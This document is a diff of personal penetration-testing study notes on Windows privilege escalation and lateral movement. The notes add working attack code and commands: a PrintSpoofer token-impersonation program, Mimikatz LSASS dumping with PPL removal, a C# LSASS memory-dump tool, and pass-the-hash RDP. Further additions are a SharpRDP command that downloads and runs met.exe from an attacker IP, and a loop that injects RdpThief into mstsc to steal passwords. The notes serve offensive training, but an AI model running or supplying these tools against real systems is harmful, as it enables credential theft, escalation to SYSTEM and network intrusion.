@@ -4008,12 +4008,14 @@ Get-LAPSComputers
 
 ## Access Token
 
-As penetration testers, 2 concepts relating to the access token, specifically integrity levels and privileges.
+As penetration testers, 2 concepts relating to the access token: integrity levels and privileges.
 
 Windows defines 4 integrity levels, which determine the level of access: low, medium, high, and system.
 
 - Low integrity is used with sandbox processes like web browsers.
+
 - Applications executing in the context of a regular user run at medium integrity, and administrators can execute applications at high integrity.
+
 - System is typically only used for SYSTEM services.
 
 It's not possible for a process of a certain integrity level to modify a process of higher integrity level but the opposite is possible.
@@ -4036,23 +4038,23 @@ whoami /priv
 
 The **SeShutdownPrivilege** privilege allows the user to reboot or shutdown the computer.
 
-It is possible to add additional privileges that will take effect after the targeted user account logs out and logs back in. Programmatically this can be done with the Win32 LsaAddAccountRights API, but more often it would be performed through a **group policy** or locally through an application like `secpol.msc`.
+It is possible to add additional privileges that will take effect after the targeted user account **logs out and logs back in**. This can be done with the Win32 LsaAddAccountRights API, but more often be performed through a **group policy** or locally through an application like `secpol.msc`.
 
-SeLoadDriverPrivilege yields the permission to load a kernel driver. If we were to apply that privilege to our user, the current token would not be modified, rather a new token would be created once the user logs out and back in again.
+**SeLoadDriverPrivilege** yields the permission to load a kernel driver.
 
 2 types of access tokens.
 
 Each process has a **primary access token** that originates from the user's token created during authentication.
 
-In addition, an **impersonation token** can be created that allows a user to act on behalf of another user without that user's credentials.
+An **impersonation token** can be created that allows a user to act on behalf of another user without that user's credentials.
 
 Impersonation tokens have four levels: Anonymous, Identification, Impersonation, and Delegation.
 
 - Anonymous and Identification only allow enumeration of information.
-- Impersonation allows impersonation of the client's identity
-- Delegation makes it possible to perform sequential access control checks across multiple machines.
 
-The latter is critical to the functionality of distributed applications.
+- Impersonation allows impersonation of the client's identity.
+
+- Delegation makes it possible to perform sequential access control checks across multiple machines.
 
 E.g., a user authenticates to a web server and performs an action on that server that requires a database lookup. The web service could use delegation to pass authentication to the database server "through" the web server.
 
@@ -4068,23 +4070,19 @@ The built-in **Network Service** account, the **LocalService** account, and the 
 
 When no tokens related to other user accounts are available in memory, we can likely force the **SYSTEM** account to give us a token that we can impersonate.
 
-Use a post exploitation attack that relies on Windows pipes.
-
 Pipes are a means of interprocess communication (IPC), just like RPC, COM, or even network sockets. A pipe is a section of shared memory inside the kernel that processes can use for communication.
 
 One process can create a pipe (the pipe server) while other processes can connect to the pipe (pipe clients) and read/write information from/to it, depending on the configured access rights for a given pipe.
 
-Anonymous pipes are typically used for communication between parent and child processes, while **named pipes** support impersonation.
+Anonymous pipes are typically used for communication between parent and child processes, while **named pipes** have more functionality and support impersonation.
 
-Force the SYSTEM account to connect to a named pipe set up by an attacker.
-
-While the technique was originally developed as part of an AD attack, it can also be used locally.
+Force the SYSTEM account to connect to a named pipe set up by an attacker. The technique was originally developed as part of an AD attack, it can also be used locally.
 
 It is based on the **print spooler service**, which is started by default and runs in a **SYSTEM** context.
 
 The print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes.
 
-If we can create a process running with the SeImpersonatePrivilege privilege that simulates a print client, we will obtain a SYSTEM token that we can impersonate.
+Create a process running with the **SeImpersonatePrivilege** privilege that simulates a print client to obtain a SYSTEM token that we can impersonate.
 
 Create a C# application that creates a pipe server (i.e. a "print client"), waits for a connection, and attempts to impersonate the client that connects to it.
 
@@ -4129,6 +4127,44 @@ namespace PrintSpooferNet
         [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
         static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
 
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
         static void Main(string[] args)
         {
             if (args.Length == 0)
@@ -4156,6 +4192,14 @@ namespace PrintSpooferNet
             Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
             string sidstr = Marshal.PtrToStringAuto(pstr);
             Console.WriteLine(@"Found sid {0}", sidstr);
+
+            IntPtr hSystemToken = IntPtr.Zero;
+            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
+
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            STARTUPINFO si = new STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
         }
     }
 }
@@ -4263,11 +4307,9 @@ The pipe name used by the print spooler service is `\pipe\spoolss`.
 
 Use the **SpoolSample** C# implementation or the PowerShell code (https://github.com/vletoux/SpoolerScanner).
 
-The SpoolSample application and the entire printer bug technique was developed to be used in an AD setting and was not specifically designed for local privilege escalation.
-
 When we use SpoolSample, specify the name of the server to connect to (the victim) and the name of the server we control (the attacker), also called the capture server.
 
-Since we are performing the attack locally, both servers are the same. This presents a challenge.
+Since we are performing the attack locally, both servers are the same. => a challenge.
 
 The print spooler service (running as SYSTEM on the victim) needs to contact the simulated print client (through our pipe) but since they are on the same host, they in effect require the same default pipe name (`pipe\spoolss`).`
 
@@ -4277,9 +4319,9 @@ Unfortunately, as mentioned before, we cannot specify "spoolss" as a name since 
 
 What happens when a file path is supplied to a Win32 API?
 
-When directory separators are used as a part of the file path, they are converted to canonical form. Specifically, forward slashes ("/") will be converted to backward slashes ("\"). This is also known as **file path normalization**.
+When directory separators are used as a part of the file path, they are converted to canonical form. Forward slashes ("/") will be converted to backward slashes ("\") => **file path normalization**.
 
-If we provide SpoolSample with an arbitrary pipe name containing a forward slash after the hostname ("appsrv01/test"), the spooler service will not interpret it correctly and it will append the default name "pipe\spoolss" to our own path before processing it. This effectively bypasses the path validation and the resulting path ("appsrv01/test\pipe\spoolss") is then normalized before the spooler service attempts to send a print object change notification message to the client.
+If we provide SpoolSample with an arbitrary pipe name containing a forward slash after the hostname ("`appsrv01/test`"), the spooler service will not interpret it correctly and it will append the default name "`pipe\spoolss`" to our own path before processing it. This effectively bypasses the path validation and the resulting path ("appsrv01/test\pipe\spoolss") is then normalized before the spooler service attempts to send a print object change notification message to the client.
 
 This pipe name differs from the default one used by the print spooler service, and we can register it in order to simulate a print client.
 
@@ -4287,16 +4329,13 @@ This pipe name differs from the default one used by the print spooler service, a
 SpoolSample.exe appsrv01 appsrv01/test
 ```
 
-```
-RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1707 - The network address is invalid.
-```
+First, the path we supplied (`appsrv01/test`) has been switched to a canonical form (`appsrv01\test`) as part of the full path.
 
-First, the path we supplied (appsrv01/test) has been switched to a canonical form (appsrv01\test) as part of the full path.
-Second, spoolsv.exe attempted to access the named pipe `\\.\appsrv01\test\pipe\spoolss` while performing the callback. Since we have not created a pipe server by that name yet, the request failed.
+Second, `spoolsv.exe` attempted to access the named pipe `\\.\appsrv01\test\pipe\spoolss` while performing the callback. Since we have not created a pipe server by that name yet, the request failed.
 
-At this point, we just need to create a pipe server with that name and simulate a print client. When we execute SpoolSample, the print spooler service will connect to our pipe.
+Create a pipe server with that name and simulate a print client. When we execute SpoolSample, the print spooler service will connect to our pipe.
 
-Open another command prompt and launch our PrintSpooferNet application. Recall that we are launching our application from a Network Service command prompt because we are demonstrating a scenario where we have exploited a process that has the SeImpersonatePrivilege, and we are trying to escalate to SYSTEM.
+Launching our **PrintSpooferNet** application from a Network Service command prompt/a process that has the SeImpersonatePrivilege
 
 ```bat
 PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
@@ -4306,62 +4345,554 @@ PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
 SpoolSample.exe appsrv01 appsrv01/pipe/test
 ```
 
-Our application reveals a connection from the "S-1-5-18" SID.
+=> A connection from the "`S-1-5-18`" SID. This SID value belongs to the SYSTEM account proving that our technique worked.
 
-This SID value belongs to the SYSTEM account proving that our technique worked.
-
-We now have a way of forcing the SYSTEM account to authenticate to our named pipe, which allows us to impersonate it.
-
-To complete this attack, we must now take advantage of the impersonated token, which we will do by **launching a new command prompt as SYSTEM**.
+=> Take advantage of the impersonated token by **launching a new command prompt as SYSTEM**
 
 The Win32 **CreateProcessWithTokenW** API can create a new process based on a token. The token must be a primary token, so we'll first use **DuplicateTokenEx** to convert the impersonation token to a primary token.
 
 **DuplicateTokenEx**:
 
-- First, we'll supply the impersonation token by recovering it with OpenThreadToken. We'll request full access to the token with the numerical value 0xF01FF for the dwDesiredAccess argument. For the third argument (lpTokenAttributes), we'll use a default security descriptor for the new token by setting this to NULL.
+1. Supply the impersonation token by recovering it with **OpenThreadToken**. We'll request full access to the token with the numerical value 0xF01FF for the dwDesiredAccess argument. For the third argument (lpTokenAttributes), we'll use a default security descriptor for the new token by setting this to NULL.
 
-- ImpersonationLevel must be set to SecurityImpersonation, which is the access type we currently have to the token. This has a numerical value of "2". For the TokenType, we'll specify a primary token (TokenPrimary36) by setting this to "1".
+2. ImpersonationLevel must be set to SecurityImpersonation, which is the access type we currently have to the token. This has a numerical value of "2". For the TokenType, we'll specify a primary token (TokenPrimary36) by setting this to "1".
 
-- The final argument (phNewToken) is a pointer that will be populated with the handle to the duplicated token.
+3. The final argument (phNewToken) is a pointer that will be populated with the handle to the duplicated token.
 
 With the token duplicated as a primary token, we can call **CreateProcessWithToken** to create a command prompt as SYSTEM.
 
-First, we'll supply the newly duplicated token followed by a logon option, which we set to its default of 0. For the third (lpApplicationName) and fourth (lpCommandLine) arguments, we'll supply NULL and the full path of cmd.exe, respectively.
+1. Supply the newly duplicated token followed by a logon option, which we set to its default of 0.
 
-The creation flags (dwCreationFlags), environment block (lpEnvironment), and current directory (lpCurrentDirectory) arguments can be set to 0, NULL, and NULL respectively to select the default options.
+2. For the lpApplicationName and lpCommandLine arguments, supply NULL and the full path of `cmd.exe`, respectively.
 
-For the two last arguments (lpStartupInfo and lpProcessInformation), we must pass STARTUPINFO37 and PROCESS_INFORMATION38 structures, which are populated by the API during execution.
+3. The creation flags (dwCreationFlags), environment block (lpEnvironment), and current directory (lpCurrentDirectory) arguments can be set to 0, NULL, and NULL respectively to select the default options.
 
-First launching our application to create the pipe server with the name "\\.\appsrv01\test\pipe\spoolss".
+4. For lpStartupInfo and lpProcessInformation, pass STARTUPINFO and PROCESS_INFORMATION structures, which are populated by the API during execution.
 
-Next, we'll launch SpoolSample with the capture server set to "\\appsrv01/pipe/test", which will force the SYSTEM account to connect to our named pipe and a new command prompt is opened.
+With this attack, we can elevate our privileges from an unprivileged account that has the SeImpersonatePrivilege to SYSTEM on any modern Windows system including Windows 2019 and the newest versions of Windows 10.
 
-When we interact with it and display the user, we find it to be SYSTEM:
+A C++ implementation that has the SpoolSample functionality embedded (https://github.com/itm4n/PrintSpoofer)
 
-```bat
-whoami /user
-```
+A similar technique that also uses pipes (https://windows-internals.com/faxing-your-way-to-system/). It impersonates the RPC system service (RpcSs), which typically contains SYSTEM tokens that can be stolen. Note that this technique only works for **Network Service**.
 
-With this attack, we can elevate our privileges from an unprivileged account that has the SeImpersonatePrivilege to SYSTEM on any modern Windows system including Windows 2019 and the newest versions of Windows 10. Nice!
-A C++ implementation of this attack that has the SpoolSample functionality embedded is available by the researcher who discovered the technique. (https://github.com/itm4n/PrintSpoofer)
+On older versions of Windows 10 and Windows Server 2016, the Juicy Potato tool obtains SYSTEM integrity through a local man-in-the-middle attack through COM. It is blocked on Windows 10 version 1809 and newer along with Windows Server 2019, 
 
-Most native and third-party services that do not require administrative permissions run as Network Service or Local Service, partly due to Microsoft's recommendation. This attack technique means that compromising an unprivileged service is just as valuable as a SYSTEM service.
+=> Release of the **RoguePotato** tool, expanding this technique to provide access to the RpcSs service and subsequently SYSTEM integrity access. (https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
 
-The technique shown in this section is not the only possible way of leveraging impersonation to obtain SYSTEM integrity. A similar technique that also uses pipes has been discovered by Alex Ionescu and Yarden Shafir. (https://windows-internals.com/faxing-your-way-to-system/) It impersonates the RPC system service (RpcSs), which typically contains SYSTEM tokens that can be stolen. Note that this technique only works for Network Service.
-
-On older versions of Windows 10 and Windows Server 2016, the Juicy Potato tool obtains SYSTEM integrity through a local man-in-the-middle attack through COM. It is blocked on Windows 10 version 1809 and newer along with Windows Server 2019, which inspired the release of the **RoguePotato** tool, expanding this technique to provide access to the RpcSs service and subsequently SYSTEM integrity access. (https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
-
-Lastly, the **beans** technique based on local man-in-the-middle authentication with Windows Remote Management (WinRM) also yields SYSTEM integrity access. The caveat of this technique is that it only works on Windows clients, not servers, by default. (https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/)
+The **beans** technique based on local man-in-the-middle authentication with Windows Remote Management (WinRM) also yields SYSTEM integrity access. The caveat of this technique is that it only works on Windows clients, not servers, by default. (https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/)
 
 ### Fun with Incognito
 
-## Kerberos and Domain Credentials
+Use the Meterpreter Incognito module to impersonate any logged in users and obtain code execution in their context without access to any passwords or hashes.
+
+This access token attack vector does not rely on Mimikatz and may evade some detection software.
+
+Meterpreter
+
+List all currently used tokens by unique Username
+Impersonate the admin user through the Win32 ImpersonateLoggedOnUser API
+
+```
+load incognito
+help incognito
+list_tokens -u
+impersonate_token corp1\\admin
+```
+
+## Mimikatz
+
+Launching Mimikatz from an elevated command prompt 
+
+As administrator, the offsec user can use **SeDebugPrivilege** to read and modify a process under the ownership of a different user.
+
+Dump all cached passwords and hashes from LSASS
+
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+The wdigest authentication protocol requires a clear text password, but it is disabled in Windows 8.1 and newer.
+
+We can enable it by creating the **UseLogonCredential** registry value in the path `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`. Once we set this value to "1", the clear text password will be cached in LSASS after subsequent logins.
+
+Microsoft has developed mitigation techniques: **LSA Protection and Windows Defender Credential Guard**.
+
+Windows divides its processes into 4 distinct integrity levels. An additional mitigation level, **Protected Processes Light (PPL)** was introduced, which can be layered on top of the current integrity level.
+
+=> A process running at SYSTEM integrity cannot access or modify the memory space of a process executing at SYSTEM integrity with PPL enabled.
+
+LSASS supports PPL protection, which can be enabled in the registry. This is done through the **RunAsPPL** DWORD value in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` with a value of 1.
+
+This protection mechanism is disabled by default due to 3rd-party compatibility issues.
+
+PPL protection is controlled by a bit residing in the **EPROCESS** kernel object associated with the target process. If we could obtain code execution in kernel space, disable the LSA protection  with `mimidrv.sys` driver.
+
+We must be local administrator or SYSTEM to dump the credentials, => also have the **SeLoadDriverPrivilege** privilege and the ability to load any signed drivers.
+
+Mimikatz can load the `mimidrv.sys` driver with the `!+` command. Once the driver is loaded, we can use it to disable the PPL protection for LSASS.
+
+```
+privilege::debug
+!+
+!processprotect /process:lsass.exe /remove
+sekurlsa::logonpasswords
+```
 
 ## Processing Credentials Offline
 
+Create a dump file with **Task Manager**, which is a snapshot of a given process. This dump includes loaded libraries and application memory.
+
+Navigate to the **Details** tab, locate the `lsass.exe` process, right-click it and choose **Create dump file**.
+
+Once the dump file is created, we can copy it from the target to our local Windows client where we can parse it with Mimikatz.
+
+When opening a dump file in Mimikatz, the target machine and the processing machine must have a **matching OS and architecture**.
+
+E.g., if the dumped LSASS process was from a Windows 10 64-bit machine; we must also parse it on a Windows 10 or Windows 2016/2019 64-bit machine. 
+
+However, processing the dump file requires **neither** an elevated command prompt nor `privilege::debug`.
+
+```
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
+
+Task Manager cannot be run as a command line tool, => need GUI access to the target. Alternatively, we can create the dump file from the command line with **ProcDump** from SysInternals.
+
+Develop our own C# application to execute a memory dump that we can parse with Mimikatz.
+
+When Task Manager and ProcDump create a dump file, they are invoking the Win32 **MiniDumpWriteDump** API.
+
+This function requires a lot of arguments, but only the first 4 are needed for our use case.
+
+- The 1st 2 arguments (hProcess and ProcessId) must be a handle to LSASS and the process ID of LSASS, respectively.
+
+- The 3rd argument (hFile) is a handle to the file that will contain the generated memory dump, and the fourth (DumpType) is an enumeration type that we'll set to MiniDumpWithFullMemory (or its numerical value of "2") to obtain a full memory dump.
+
+
+```csharp
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+
+
+namespace MiniDump
+{
+    class Program
+    {
+        [DllImport("Dbghelp.dll")]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, 
+          IntPtr hFile, int DumpType, IntPtr ExceptionParam, 
+          IntPtr UserStreamParam, IntPtr CallbackParam);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, 
+          int processId);
+
+        static void Main(string[] args)
+        {
+            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
+
+            Process[] lsass = Process.GetProcessesByName("lsass");
+            int lsass_pid = lsass[0].Id;
+
+            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
+
+            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+        }
+    }
+}
+```
+
+`C:\Windows\tasks\lsass.dmp`
+
+```bat
+MiniDump.exe
+```
+
+```
+sekurlsa::minidump C:\Windows\tasks\lsass.dmp
+sekurlsa::logonpasswords
+```
+
 # Windows Lateral Movement
 
+## Remote Desktop Protocol
+
+Connecting to a workstation with Remote Desktop will disconnect any existing session.
+
+The `/admin` flag allows us to connect to the admin session, which does not disconnect the current user if we perform the login with the same user.
+
+```bat
+mstsc.exe /v:appsrv01 /admin
+```
+
+`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TerminalServer` --> look for **fSingleSessionPerUser**
+
+fSingleSessionPerUser  === 1 --> Only one session per user
+fSingleSessionPerUser  === 0 --> Multiple sessions per user
+
+
+When an RDP connection is created, the NTLM hashes will reside in memory for the duration of the session. The session does not terminate without a proper logout => simply disconnecting from the sessions will leave the hashes in memory.
+
+To prevent attackers from stealing credentials on a compromised server, Microsoft introduced RDP with **restricted admin mode**, which allows system administrators to perform a network login with RDP.
+
+A network login does not require clear text credentials and will not store them in memory, essentially disabling single sign-on. This type of login is commonly used by service accounts.
+
+We can use restricted admin mode by supplying the **/restrictedadmin** argument to `mstsc.exe`. When we supply this argument, the current login session is used to authenticate the session. Note that we do not enter a password for this transaction.
+
+```bat
+mstsc.exe /v:appsrv01 /restrictedadmin
+```
+
+Since we used restricted admin mode, no credentials have been cached, which helps mitigate credential theft.
+
+Restricted admin mode is disabled by default but the setting can be controlled through the **DisableRestrictedAdmin** registry entry at the following path:
+`HKLM:\System\CurrentControlSet\Control\Lsa`
+
+While restricted admin mode protects against credential theft on the target, it is now possible to **pass the hash** when doing lateral movement with mstsc.
+
+Assume that we are already in possession of the admin user NTLM hash. Use the pth command to launch a `mstsc.exe` process in the context of the admin user:
+
+```
+privilege::debug
+sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
+```
+
+Restricted admin mode is not enabled by default. However, if we are in possession of a password hash for a local account on the target machine, we can enable it in order to be able to use a RDP connection to that target.
+
+Disable the restricted admin mode on our appsrv01 target.
+
+```pwsh
+Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin
+```
+
+When we click Connect, we are presented with the error message which indicates that restricted admin mode is disabled.
+
+To re-enable restricted admin mode, launch a local instance of PowerShell on the Windows 10 machine in the context of the admin user with Mimikatz.
+
+```
+sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
+```
+
+```pwsh
+Enter-PSSession -Computer appsrv01
+```
+
+```pwsh
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
+```
+
+xfreerdp RDP client, which is installed on a Kali system by default, supports restricted remote admin connections as well.
+
+```bash
+xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
+```
+
+## Reverse RDP Proxying with Metasploit
+
+`multi/manage/autoroute` module allow us to configure a reverse tunnel through the Meterpreter session and use that with a SOCKS proxy.
+
+```
+use multi/manage/autoroute
+set session 1
+exploit
+
+use auxiliary/server/socks_proxy
+set srvhost 127.0.0.1
+exploit -j
+```
+
+Use a local proxy application like Proxychains to force TCP traffic through a TOR or SOCKS proxy:
+
+```bash
+sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf' 
+```
+
+```bash
+proxychains rdesktop 192.168.120.10
+```
+
+## Reverse RDP Proxying with Chisel
+
+On Kali:
+
+Start chisel in server mode, specify the listen port with -p and --socks5 to specify the SOCKS proxy mode.
+
+```bash
+./chisel server -p 8080 --socks5
+```
+
+Configure a SOCKS proxy server with the Kali SSH server.
+
+Enable password authentication by uncommenting the appropriate line in the `sshd_config` file.
+
+After the service is started, we'll connect to it with ssh and supply -N to ensure commands are not executed but merely forwarded and -D to configure a SOCKS proxy.
+
+```bash
+sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+sudo systemctl start ssh.service
+
+ssh -N -D 0.0.0.0:1080 localhost
+```
+
+On Windows:
+
+```bat
+chisel.exe client 192.168.119.120:8080 socks
+```
+
+On Kali:
+
+```bash
+sudo proxychains rdesktop 192.168.120.10 
+```
+
+## RDP as a Console
+
+Although RDP can also be used as a command-line tool.
+
+The RDP application (mstsc.exe) builds upon the terminal services library mstscax.dll. This library exposes interfaces to both scripts and compiled code through COM objects.
+
+**SharpRDP** is a C# application that uses uses the non-scriptable interfaces exposed by mstscax.dll to perform authentication in the same way as mstsc.exe.
+
+Once authentication is performed, SharpRDP allows us to execute code through SendKeys.
+
+```bat
+sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
+```
+
+## Stealing Clear Text Credentials from RDP
+
+When a user creates a Remote Desktop session with mstsc.exe, they enter clear text credentials into the application.
+
+Analyze an application that can detect and dump these credentials from memory for us, effectively working as a more targeted keylogger.
+
+This technique relies on the concept of **API hooking**.
+
+As a basic theoretical example, let's imagine that we are able to hook the **WinExec** API, which can be used to start a new application.
+
+- The first argument (lpCmdLine) is an input buffer that will contain the name of the application we want to launch.
+
+If we are able to pause the execution flow of an application when the API is invoked (like a breakpoint in WinDbg), we could redirect the execution flow to custom code that writes a different application name into the input buffer. Continuing execution would trick the API into starting a different application than the one intended by the user.
+
+Likewise, we could execute custom code that copies the content of the input buffer, return it to us, and continue execution unaltered.
+
+Instead of pausing execution, we could overwrite the initial instructions of an API at the assembly level with code that transfers execution to any custom code we want.
+
+The Microsoft-provided unmanaged **Detours** library makes this possible and would allow an attacker to leak information from any API.
+
+Our goal is to leverage API hooking to steal the clear text credentials entered into mstsc when they are processed by relevant APIs.
+
+MDSec discovered that the APIs responsible for handling the username, password, and domain are **CredIsMarshaledCredentialW**, **CryptProtectMemory**, and **SspiPrepareForCredRead** respectively.
+
+=> release RdpThief, which uses Detours to hook these APIs.
+
+The hooks in this tool will execute code that copies the username, password, and domain to a file. Finally, RdpThief allows the original code execution to continue as intended.
+
+RdpThief is written as an unmanaged DLL and must be injected into an `mstsc.exe` process before the user enters the credentials.
+
+Modify our injection code further to automatically detect when an instance of mstsc is started and then inject into it.
+
+Implement this with an infinitely-running while loop. With each iteration of the loop, we'll discover all instances of mstsc.exe and subsequently perform an injection into each of them.
+
+Use the Thread.Sleep method to pause for one second between each iteration.
+
+`Inject.exe`
+
+```csharp
+using System;
+using System.Diagnostics;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+
+namespace Inject
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        static void Main(string[] args)
+        {
+
+            // String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            // String dllName = dir + "\\RdpThief.dll";
+            // WebClient wc = new WebClient();
+            // wc.DownloadFile("http://192.168.119.120/RdpThief.dll", dllName);
+
+            String dllName = "C:\\Tools\\RdpThief.dll";
+
+            while (true)
+            {
+                Process[] mstscProc = Process.GetProcessesByName("mstsc");
+                if (mstscProc.Length > 0)
+                {
+                    for (int i = 0; i < mstscProc.Length; i++)
+                    {
+                        int pid = mstscProc[i].Id;
+
+                        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+                        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                        IntPtr outSize;
+                        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+                        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+                        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+                    }
+                }
+
+                Thread.Sleep(1000);
+            }
+        }
+    }
+}
+```
+
+Dump the contents of the RdpThief output file to find the clear text credentials.
+
+```bat
+type C:\Users\<User>\AppData\Local\Temp\data.bin
+```
+
+```bat
+Inject.exe
+mstsc.exe
+```
+
+## Fileless Lateral Movement
+
+At a high level, PsExec authenticates to SMB on the target host and accesses the DCE/RPC interface. PsExec will use this interface to access the service control manager, create a new service, and execute it.
+
+The binary that is executed by the service is copied to the target host.
+
+=> Implement a variant of PsExec that neither writes a file to disk nor creates an additional service to obtain code execution
+
+Authentication to the DCE/RPC interface and the service control manager is handled by the unmanaged **OpenSCManagerW** API.
+
+To invoke OpenSCManagerW, we must supply the hostname of the target (lpMachineName) and the name of the database for the service control database (lpDatabaseName). Supplying a null value will use the default database.
+
+Finally, we must pass the desired access (dwDesiredAccess) to the service control manager. The API is executed in the context of the access token of the executing thread, which means no password is required.
+
+If authentication is successful, a handle is returned that is used to interact with the service control manager.
+
+PsExec performs the same actions when invoked, but then it calls **CreateServiceA** to set up a new service.
+
+We will instead use the **OpenService** API to open an existing service and invoke **ChangeServiceConfigA** to **change the binary that the service executes**.
+
+=> will not leave any service creation notifications and may evade detection.
+
+Once the service binary has been updated, we will issue a call to **StartServiceA**, which will execute the service binary and give us code execution on the remote machine.
+
+Since we control the service binary, we can use a PowerShell download cradle to avoid saving a file to disk.
+
+If endpoint protections such as application whitelisting are in place, this approach may not be as straightforward and may require a bypass (such as the use of InstallUtil or an XSL transform).
+
+Since the OpenSCManagerW authentication API executes in the context of the access token of the thread, it is very easy to pass the hash with this technique as well. We could simply use Mimikatz to launch the application with the `sekurlsa::pth` command.
+
+```csharp
+using System;
+using System.Runtime.InteropServices;
+
+namespace lat
+{
+    class Program
+    {
+        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
